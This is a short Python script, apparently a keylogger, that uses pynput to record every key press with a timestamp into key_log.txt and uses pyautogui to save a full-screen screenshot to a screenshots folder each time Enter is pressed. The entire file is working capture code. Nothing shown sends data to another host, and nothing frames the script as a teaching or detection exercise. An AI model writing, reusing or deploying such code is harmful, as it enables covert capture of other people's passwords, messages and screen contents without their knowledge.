from pynput.keyboard import Listener,Key
from datetime import datetime
import os
import pyautogui 

if not os.path.exists("screenshots"):
    os.makedirs("screenshots")

def write(key):

    keydata=str(key)

    keydata=keydata.replace("'","")
    keydata=keydata.replace("Key.space","[SPACE]")
    keydata=keydata.replace("Key.enter","[ENTER]")
    keydata=keydata.replace("Key.shift","[SHIFT]")
    keydata=keydata.replace("Key.tab","\t")
    keydata=keydata.replace("Key.backspace","[BACKSPACE]")
    keydata=keydata.replace("Key.caps_lock","[CAPS]")
    keydata=keydata.replace("Key.alt","[ALT]")

    timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("key_log.txt","a") as f:
        f.write(f"[{timestamp}]:{keydata}\n")
    
    if key==Key.enter:
        time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_path = os.path.join("screenshots", f"screen_{time}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)


with Listener(on_press=write) as l:
    l.join()
